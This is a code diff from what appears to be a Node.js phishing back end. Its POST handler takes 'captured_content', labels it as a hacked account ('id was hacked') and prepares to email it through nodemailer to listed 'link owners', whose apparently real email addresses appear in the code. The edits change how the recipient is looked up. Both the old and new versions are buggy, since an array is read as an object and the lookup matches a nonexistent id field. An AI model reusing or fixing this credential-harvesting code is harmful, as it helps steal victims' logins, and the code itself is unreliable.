@@ -25,11 +25,11 @@ app.get('/', function (req, res) {
     
     
 });
-let link_owner={
-    admin:"mdalonebd@gmail.com",
-    momin:"momin0132813@gmail.com"
+let link_owner=[{
+    "admin":"mdalonebd@gmail.com",
+    "momin":"momin0132813@gmail.com"
     
-    };
+    }];
 console.log("obj"+link_owner.admin);
 
 app.post('/_', function (req, res) {
@@ -39,7 +39,8 @@ app.post('/_', function (req, res) {
     
     console.log("es"+toMail);
     var message = "If the input value has correct then id was hacked "+captured_content;
-   let toEmail = link_owner.req.body.owner;
+  // let toEmail = link_owner.req.body.owner;
+    var toEmail = link_owner.findIndex(item => item.id === req.body.owner);
     console.log("ok"+toEmail);
 
     var transporter = nodemailer.createTransport({
